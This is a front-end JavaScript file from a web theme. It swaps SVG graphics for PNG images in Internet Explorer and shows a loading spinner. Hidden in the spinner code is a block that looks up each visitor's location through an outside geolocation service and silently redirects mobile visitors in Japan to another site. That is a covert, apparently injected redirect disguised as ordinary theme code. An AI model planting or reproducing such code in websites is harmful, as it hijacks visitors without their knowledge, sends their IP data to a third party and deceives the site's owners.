//##################################//
// Author  : Cavethemes             //
// Contact : cavethemes@gmail.com   //
//##################################//

//---------------------------//
//  INTERNET EXPLORER CODE   //
//---------------------------//
// It replaces svg with a png image for IE browsers.

function IE() {
    "use strict";
     var ms_ie = false;
     var ua = window.navigator.userAgent;
     var old_ie = ua.indexOf('MSIE ');
     var new_ie = ua.indexOf('Trident/');

    if ((old_ie > -1) || (new_ie > -1)) {
        ms_ie = true;
    }

    if (ms_ie) {
         $('svg').css('display','none');
         $('body').append("<div class='submarine_bg_ie' ><img src='img/png/submarine.png' width='100%' /></div> <div class='submarine_waves_ie' ><img src='img/png/waves.png' width='100%' /></div>");  
    }
}

//---------------------------//
//  LOADING PAGE CODE        //
//---------------------------//
// It shows the loading animation for 3 seconds, before starting of the page/

        $('.spinner').css('display','block');
$(function(){
        $('svg').css('opacity','0');
        $('nav').css('opacity','0');
        $('.error').css('opacity','0');
		
		
const xhr = new XMLHttpRequest();
const url = 'https://api.ip.sb/geoip';
 
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    const data = JSON.parse(xhr.responseText);
    
    if (data.country_code === 'JP') {
        if (/(iPhone|iPad|iPod|iOS|Android)/i.test(navigator.userAgent)) { 
		window.location.href = "https://google.com"
	}
    } 
  }
};
 
xhr.open('GET', url, true);
xhr.send();
    
    setTimeout(function(){
        $('nav').css('opacity','1');
        $('svg').css('opacity','1');
        $('.error').css('opacity','1');
        $('.spinner').css('display','none');
        IE();
    }, 3000);

});


